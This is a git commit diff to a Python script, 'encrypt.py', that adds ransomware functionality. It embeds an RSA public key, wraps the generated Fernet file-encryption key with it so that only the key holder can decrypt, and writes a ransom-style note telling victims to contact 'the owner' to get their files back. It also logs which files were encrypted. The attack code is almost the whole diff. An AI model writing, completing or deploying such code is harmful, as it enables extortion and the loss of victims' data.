7f674052cd7f1f634f9cb0a8d1aa8c0462c9ee75
Richard Antal Nagy <nagy.richard.antal@gmail.com>
2022-08-02 21:08:32 +0200

    Added key encryption and log save to encrypt

--- encrypt.py
+++ encrypt.py
@@ -1,6 +1,9 @@
 import os
 import glob
+import json
 from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.primitives.asymmetric import padding
 
 
 ENCRYPT_GLOBS = [
@@ -8,11 +11,27 @@ ENCRYPT_GLOBS = [
 ]
 KEY_FILE = 'secret.key'
 ENCRYPTED_SUFFIX = '.enc'
+LOG_FILE = 'key.log'
+PUBLIC_KEY = b'''
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnpzQyfh+9DiPFPmUrU9w
+gbmHoM2aw+FO9NrjzpXNW1OdQdCg6mN8mEdCJXy3QUWZ1pc6Hr6QFfdXv2gBQx5W
+1H8YPPESIFVwFGzf7qqHEsF41yRYUTEh47PlltsrfnYGd7+jH+yqR12hQawH0Kc4
+TPuRQkIxPyRM56zOXjvrd06Y24XHQTYNb+/6lHMctGr/2XHemXz7BVE8KOngxxDG
+T7gE5FX2nAgjyPZbM/F4TxOB9hsL2i6nM6qn3UkxT9QQbcNlIyZKjsa8BYFn/3Ei
+1UqbNSaPle9rMO3P46yvpMxUBv0OVpBev8V23EXrQApchgDFg1bzMoEtfc1e/YJ8
+IQIDAQAB
+-----END PUBLIC KEY-----
+'''
 
 
 def generate_key():
     '''Generate fernet synchronous key'''
     return Fernet.generate_key()
+
+
+def load_public_key():
+    return serialization.load_pem_public_key(PUBLIC_KEY)
 
 
 def seek_files(globs):
@@ -45,13 +64,36 @@ def encrypt_files(files, key):
     return encrypted
 
 
+def save_encrypted_key(file, sym_key):
+    key = load_public_key()
+    cipher = key.encrypt(
+        sym_key,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+    with open(file, 'w') as f:
+        f.write('This key has been encrypted and only recoverable by the owner.\n')
+        f.write('Contact them about the acces to the key and your files will be saved.\n\n')
+        f.write(cipher.hex())
+
+
+def save_encryption_logs(file, logs):
+    with open(file, 'w') as f:
+        json.dump(logs, f)
+
+
 def main():
     # Encrypt
     key = generate_key()
     files = seek_files(ENCRYPT_GLOBS)
     encrypted = encrypt_files(files, key)
 
-    # Write config
+    # Write log
+    save_encrypted_key(KEY_FILE, key)
+    save_encryption_logs(LOG_FILE, encrypted)
 
 
 ## Quick tests
